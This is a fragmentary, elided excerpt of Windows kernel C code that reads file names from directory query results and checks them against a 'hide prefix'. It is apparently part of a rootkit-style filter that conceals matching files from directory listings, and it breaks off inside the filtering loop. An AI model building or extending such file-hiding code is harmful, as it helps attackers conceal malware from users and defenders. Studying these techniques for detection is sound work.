...
/// <param name="fileNameLength">Pointer to ULONG variable to hold the length in characters of the filename.</param>
void GetFileName(FILE_INFORMATION_CLASS FileInformationClass, PVOID FileInformation, PWCHAR name, PULONG fileNameLength)
{
	...
	*fileNameLength = 0;
	...
	if (fileName && *fileNameLength > 0)
	{
		*fileNameLength /= sizeof(WCHAR);
		wmemcpy(name, fileName, *fileNameLength); // Copies the file name into the name pointer.
		ForceNullTerminationWide(name, *fileNameLength);
	}
}
...
BOOLEAN CheckHideFile(PWCHAR path, PWCHAR name, ULONG nameLength)
{
	// Check if the file name begins with the hide prefix.
	if (enableHidePrefix && nameLength >= wcslen(HIDE_PREFIX) && !wcsncmp(name, HIDE_PREFIX, wcslen(HIDE_PREFIX)))
		return TRUE;
...
NTSTATUS FilteringProccess(NTSTATUS status, HANDLE FileHandle, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, FILE_INFORMATION_CLASS FileInformationClass, ULONG Length)
{
	...
	do
	{
		...
		GetFileName(FileInformationClass, current, currentName, &currentNameLength); // Gets the current file name from the current FileInformation object.
		if (CheckHideFile(currentPath, currentName, currentNameLength))
		{
